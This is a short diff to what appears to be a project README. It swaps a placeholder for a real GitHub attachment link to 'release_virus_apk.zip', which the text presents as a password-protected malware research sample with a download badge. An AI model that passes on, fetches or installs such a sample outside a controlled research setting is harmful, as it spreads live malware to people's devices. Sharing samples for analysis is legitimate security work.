@@ -57,7 +57,7 @@ Curious about how it operates under the hood? You can watch the full demonstrati
 **Notice:** The application file has been compressed and password-protected to prevent accidental execution and to comply with automated security scanners.
 
 <div align="center">
-  <a href="YOUR_DOWNLOAD_LINK_HERE">
+  <a href="https://github.com/user-attachments/files/31927060/release_virus_apk.zip">
     <img src="https://img.shields.io/badge/⬇️-DOWNLOAD_RESEARCH_SAMPLE-2ea44f?style=for-the-badge" alt="Download Sample">
   </a>
   <br><br>
